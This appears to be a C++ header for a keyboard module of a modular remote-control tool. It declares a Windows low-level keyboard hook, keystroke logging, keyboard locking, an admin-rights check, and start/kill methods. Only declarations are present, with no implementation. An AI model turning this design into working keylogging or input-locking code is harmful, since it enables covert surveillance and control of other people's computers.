#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <iostream>
#include <sstream>

#include "../RCDOmod.h"
#include "../utils.h"

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
bool setHook();
bool releaseHook();
void logKeystroke(int);
void lockKeyboard();
void releaseKeyboard();

extern HHOOK ghHook; // global handle to the hook
extern KBDLLHOOKSTRUCT kbdStruct;
extern const wchar_t *KB_ENV;

class KeyboardMod: public RCDOMod {
    public:
        int requireAdmin();
        void start();
        void kill();
};

#endif
